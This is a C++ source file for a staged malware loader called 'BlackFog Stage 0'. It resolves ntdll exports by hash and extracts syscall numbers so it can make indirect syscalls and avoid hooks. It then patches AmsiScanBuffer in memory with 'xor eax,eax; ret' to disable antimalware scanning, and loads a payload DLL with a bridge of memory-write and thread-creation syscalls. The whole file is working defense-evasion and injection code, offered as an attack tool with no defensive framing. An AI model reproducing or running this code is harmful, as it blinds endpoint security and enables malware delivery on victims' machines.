#include <iostream>
#include "Core.h"

class BlackFogStageZero {
public:
    bool Initialize() {
        std::wcout << L"[*] BlackFog Stage 0 initialization..." << std::endl;

        ntdllBase = Fog::Core::GetModuleBase(L"ntdll.dll");
        if (!ntdllBase) return false;

        // Find functions and extract SSN
        g_ssn_allocate = Fog::Core::ExtractSSN(Fog::Core::GetExportAddress(ntdllBase, Fog::Core::HASH_NT_ALLOCATE));
        g_ssn_protect = Fog::Core::ExtractSSN(Fog::Core::GetExportAddress(ntdllBase, Fog::Core::HASH_NT_PROTECT));
        g_ssn_write = Fog::Core::ExtractSSN(Fog::Core::GetExportAddress(ntdllBase, Fog::Core::HASH_NT_WRITE));
        g_ssn_thread = Fog::Core::ExtractSSN(Fog::Core::GetExportAddress(ntdllBase, Fog::Core::HASH_NT_THREAD));

        // We check that everything loaded successfully and we weren't "hooked"
        if (!g_ssn_allocate || !g_ssn_protect || !g_ssn_write || !g_ssn_thread) {
            std::wcout << L"[-] Failed to resolve Syscalls cleanly. Aborting." << std::endl;
            return false;
        }

        std::wcout << L"[+] Arsenal loaded dynamically." << std::endl;
        return true;
    }

    void ExecuteBlinding() {
       
        if (!ntdllBase) {
            ntdllBase = Fog::Core::GetModuleBase(L"ntdll.dll");
        }
        if (!ntdllBase) return;
        std::wcout << L"[*] Target: amsi.dll" << std::endl;
        LdrLoadDll _LdrLoadDll = (LdrLoadDll)Fog::Core::GetExportAddress(ntdllBase, 0x4EE660C1);
        if (!_LdrLoadDll) {
            std::wcout << L"[-] Failed to find LdrLoadDll address." << std::endl;
            return;
        }
        wchar_t amsiName[] = L"amsi.dll";
        UNICODE_STRING usAmsi = { 0 };
        usAmsi.Buffer = amsiName;
        usAmsi.Length = (USHORT)(wcslen(amsiName) * sizeof(wchar_t));
        usAmsi.MaximumLength = usAmsi.Length + sizeof(wchar_t);
        HANDLE hAmsi = NULL;
        NTSTATUS status = _LdrLoadDll(NULL, NULL, &usAmsi, &hAmsi);
        if (status == 0 && hAmsi) {
            std::wcout << L"[+] amsi.dll loaded at: " << hAmsi << std::endl;

            // 4. We search for the address of the scanning function using your hash (0x27D9EE2C)
            uintptr_t pAmsiScanBuffer = Fog::Core::GetExportAddress((uintptr_t)hAmsi, 0x27D9EE2C);
            if (pAmsiScanBuffer) {
                // Our patch: xor eax, eax (31 C0) + ret (C3)
                // This will force the function to always return AMSI_RESULT_CLEAN
                BYTE patch[] = { 0x31, 0xC0, 0xC3 };
                SIZE_T patchSize = sizeof(patch);
                ULONG oldProtect = 0;

                // 5. Change access rights to PAGE_READWRITE (0x04)
                // Use your indirect call from the assembler
                Syscall_NtProtectVirtualMemory( (HANDLE)-1,(PVOID*)&pAmsiScanBuffer,&patchSize, PAGE_READWRITE, &oldProtect );

                // 6. Writing a patch directly into the function's memory
                // Your indirect call again
                Syscall_NtWriteVirtualMemory((HANDLE)-1, (PVOID)pAmsiScanBuffer,patch,patchSize, NULL );

                // 7. Return access rights back (to the old ones, which were saved in oldProtect)
                Syscall_NtProtectVirtualMemory( (HANDLE)-1, (PVOID*)&pAmsiScanBuffer, &patchSize, oldProtect, &oldProtect);

                std::wcout << L"[+] AMSI successfully blinded!" << std::endl;
            }
            else {
                std::wcout << L"[-] Failed to find AmsiScanBuffer." << std::endl;
            }
        }
        else {
            std::wcout << L"[-] Failed to load amsi.dll via LdrLoadDll." << std::endl;
        }
    }
    

    void InjectPayload() {
        std::wcout << L"[*] Launching BlackFog C# Core..." << std::endl;

        // 1. Загружаем нашу NativeAOT DLL
        HMODULE hCore = LoadLibraryW(L"BlackFog.dll");
        if (!hCore) {
            DWORD error = GetLastError();
            std::wcout << L"[-] LoadLibrary failed. Error code: " << error << std::endl;
        }
        if (hCore) {

            // Use our struct name SYSCALL_BRIDGE (as you declared via typedef)
            typedef void (*InitCoreFunc)(SYSCALL_BRIDGE*);
            InitCoreFunc _InitializeCore = (InitCoreFunc)GetProcAddress(hCore, "InitializeCore");

            if (_InitializeCore) {
                // 3. Assembling our "Bridge"
                SYSCALL_BRIDGE bridge = { 0 };

                // ATTENTION: We pass the ADDRESSES of wrapper functions from your .asm
                bridge.NtAllocateAddr = (uintptr_t)Syscall_NtAllocateVirtualMemory;
                bridge.NtProtectAddr = (uintptr_t)Syscall_NtProtectVirtualMemory;
                bridge.NtWriteAddr = (uintptr_t)Syscall_NtWriteVirtualMemory;
                bridge.NtThreadAddr = (uintptr_t)Syscall_NtCreateThreadEx;

                _InitializeCore(&bridge);
            }
            else {
                std::wcout << L"[-] Failed to find InitializeCore in DLL." << std::endl;
            }
        }
        else {
            std::wcout << L"[-] BlackFogCore.dll not found next to the loader." << std::endl;
        }
    }
};

int main() {
    BlackFogStageZero loader;

    if (loader.Initialize()) {
        loader.ExecuteBlinding();
        loader.InjectPayload();
    }

    while (!GetAsyncKeyState(VK_DELETE)) {}
    return 0;
}